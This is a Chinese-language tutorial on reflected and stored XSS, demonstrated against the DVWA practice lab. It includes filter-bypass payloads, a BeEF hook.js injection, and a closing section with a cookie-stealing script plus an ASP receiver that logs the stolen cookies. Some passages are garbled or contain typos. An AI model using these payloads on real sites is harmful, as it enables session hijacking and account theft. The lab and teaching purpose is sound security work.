XSS跨站脚本攻击(Cross Site Scripting),是将Java script代码插入web页面中，之后当用户浏览页面时,
会执行嵌套在web页面里面的Java script代码,从而达到攻击用户的目的。为了跟HTML里面的层叠样式表(CSS ,Cascading Style
Sheets)作区分，所以叫作XSS.

### 反射型XSS的入侵过程:

攻击者将含有恶意JavaScript代码的URL发给用户==>用户打开URL==>web应用程序对攻击者的JavaScript做出回应==>用户浏览器向攻击者发送会话信息==>攻击者使用会话信息跟web服务器进行交互。

攻击步骤:

(1)用户正常登录web应用程序,登录之后获得一个cookie

(2)攻击者将含有攻击代码的URL发送给用户

(3)用户打开URL

(4)Web服务器执行该URL中用户的请求,同时执行该URL中所包含的的JavaScript代码

(5)攻击者可以使用的攻击代码的的可以将用户的cookie信息发送到cookie_save.php

(6)攻击者获得用户的cookie之后可以将这些信息进行登录.

危害:可以给对方浏览器构造一个恶意弹窗,可以在XSS里面加入恶意代码或者恶意链接等

打个比喻alert(“XSS”),如果换成[inframescr=](inframescr=%5Bhttp%3A//127.0.0.1.exe%5D\(http://127.0.0.1.exe)<http://127.0.0.1.exe>),如果<http://127.0.0.1.exe>是一个木马之后浏览这个页面的网站管理员跟用户都会感染木马

### 储存型XSS入侵过程:

web执行恶意代码构造URL==>用户访问这个网站==>在这浏览器中执行恶意JavaScript代码==>将cookie等重要参数返回到攻击者

危害:可以获取用户的信息,cookie等。

在本文XSS实验中，我们用弹窗作为现象。为什么我们在这里用弹窗呢,因为弹窗最明显

## XSS反射型

我们打开DVWA中的XSS(Reflection）

![1.png](https://image.3001.net/images/20180828/1535430931_5b84d11364fee.png!small)

之后我们在what’s your name?里面任意输入一个东西就会返回hello，下面我们以1为例。

![2.png](https://image.3001.net/images/20180828/1535430976_5b84d1405fa9f.png!small)

我们也可以在这输入XSS脚本我们这拿alert(2)举例子

![3.png](https://image.3001.net/images/20180828/1535434655_5b84df9f514ed.png!small)

我们可以构造一个弹窗，我们用burp抓一下包丢到扫描器里面扫一下得到了以下结果。

![4.png](https://image.3001.net/images/20180828/1535434665_5b84dfa928bbb.png!small)

下面，我们来看一下这个结果的报告

漏洞详情(Issue detail):

name请求参数的值作为标签之间的纯文本复制到HTML文档中.它的payload(arz4valert(1)pxrmb)中已经将name参数中提交.由于该参数在浏览器中未被过滤,所以可以将Java
script注入到这个应用响应中

DVWA中级别的方法是利用嵌套进绕过`<scr<script>ipt>alert(“1”)</scr<script>ipt>`。在中级别xss会过滤`<script>`标签，但是不会进行反复过滤。

我们看一下中级的代码:

    
    
    <?php 
    header ("X-XSS-Protection: 0"); 
    // Is there any input?
    if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
        // Get input   $name = str_replace( '<script>', '', $_GET[ 'name' ] );
         $name = str_replace( '<script>', '', $_GET[ 'name' ] );
        // Feedback for end user
        echo "<pre>Hello ${name}</pre>";
    } 
    ?>
    

最高级别的方法是`<a
herf=Javasrcipt:alert(“XSS”)>1</a>`。利用这里面的Javascript:alert(“XSS”)进行编码就可以绕过。

高级的代码：

    
    
    <?php 
    header ("X-XSS-Protection: 0");
    // Is there any input?
    if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {    
         // Get input     
         $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );    
         // Feedback for end user     
         echo "<pre>Hello ${name}</pre>"; } 
    ?>
    

**储存型XSS**

浏览器中有一个非常重要的安全机制叫做同源,同源的意思是只有同一个域里面的东西才能相互使用cookie。Cookie指某些网站为了辨别用户身份、进行
session 跟踪而储存在用户本地终端上的数据（通常经过加密）。cookie保存在浏览器中。

在储存型XSS中可以用herf属性进行绕过：

例如:`<A HERF=URL>link</A>`

我们首先打开一个叫做beef-XSS的工具。

![5.png](https://image.3001.net/images/20180828/1535435258_5b84e1fa30d4c.png!small)BeEF是一个用于合法研究和测试目的的专业浏览器漏洞利用框架，它允许有经验的渗透测试人员或系统管理员对目标进行攻击测试，攻击成功以后会加载浏览器劫持会话。

我们在终端输入beef-xss之后，不光在终端上出现如上界面，还会出现浏览器页面。网页端beEF的账号密码都是beef。

###
![6.png](https://image.3001.net/images/20180828/1535435309_5b84e22dd4a86.png!small)

我们在DVWA的储存型XSS里面输入`<script
scr="[[<http://192.168.0.103:3000/hook.js>](<http://192.168.0.103:3000/hook.js>)]([<http://192.168.0.103:3000/hook.js>](<http://192.168.0.103:3000/hook.js>))”></script>`。在beef里面出现如下界面。

![7.png](https://image.3001.net/images/20180828/1535435415_5b84e2975a672.png!small)

这个之后我们双击127.0.0.1之后进入这个页面

![8.png](https://image.3001.net/images/20180828/1535435431_5b84e2a78c15c.png!small)之后我们点击Commands(命令)之后在这里面输入cookie

![9.png](https://image.3001.net/images/20180828/1535435456_5b84e2c08a725.png!small)

之后我们回车，并点击get cookie

![12.png](https://image.3001.net/images/20180828/1535435521_5b84e30167934.png!small)之后点击Execute(执行）。之后就会弹回来cookie去掉输入中的引号

###
![13.png](https://image.3001.net/images/20180828/1535435534_5b84e30ef2250.png!small)问题背景(Issue
background):

当一个数据请求以不安全的方式返回到应用程序响应中的时候,我们就可以判断这是个发射去掉输入中的引号

型XSS.我们可以构建一个请求,如果由另外一个用户触发,我们写的恶意Java script代码就可以在对方浏览器运行.我们写的Java
script代码可以进行各种操作,例如窃取cookie用受害人的身份登录,进行操作.

### XSS的传播方式

1.可以通过邮件或者某些其他的通讯方式,给受害者发送一个含有恶意URL的链接

2.在一些热门网站的评论区进行恶意Javascript代码插入

3.可以创建一个网站之后让所有人都可见,以便于对用户发起XSS攻击(GET或者POST请求)进行跨域

### XSS的影响:

XSS受影响程度取决于受攻击的人,其包含的数据和功能会不会影响同一个域内的其他人或者其他应用程序.如果是在某一个不重要的位置,例如某个不敏感而且没有身份验证或者控制访问的地方,XSS几乎没有什么用.如果是在关键的地方,例如cookie里面,这样就会威胁到其他的应用程序所以被判定为危险.同样如果XSS被用到钓鱼上面,那么XSS就会增加用户的信任,同时安全软件也不会警告.从而使用木马进行进一步攻击。

### 防御策略:

1.在输入的地方进行严格的验证,例如个人信息的长度,电子邮箱的正则表达式的匹配.也就是我们俗称的白名单.

2.把用户输入任何位置的信息进行HTML编码,将用户输入所有<>和””进行替换.在应用程序中限制用户使用HTML标签跟熟悉.

3.去掉`<img>`,`<a>`,`<script>`等标签。

4.限制输入字符

5.去掉输入中的引号

6.对输入的URL进行解码,之后进行编码

7.将重要的cookie标记为http only

### 攻击姿势

窃取cookie的XSS代码：

    
    
    <script>document.location=’[http://127.0.0.1/1.asp?msg=](http://127.0.0.1/1.asp?msg=)’+document.cookie</script> 
    
    <%
    
    Thisfile=Server.MapPath(“cookie.txt”)
    
    Msg=Request(“msg”)
    
    Setfs=server.CreateObject(“scripting.filesystemobject”)
    
    Setthisfile=fs.OpenTextFile(thsfile,8True,0)
    
    thisfile.WriteLine(“======cookie:”&msg&”=====byXSS”)
    
    Thisfile.close
    
    Setfs=nothing
    
    %>
    

***本文属北京丁牛科技出品，如需转载请标明出处。**

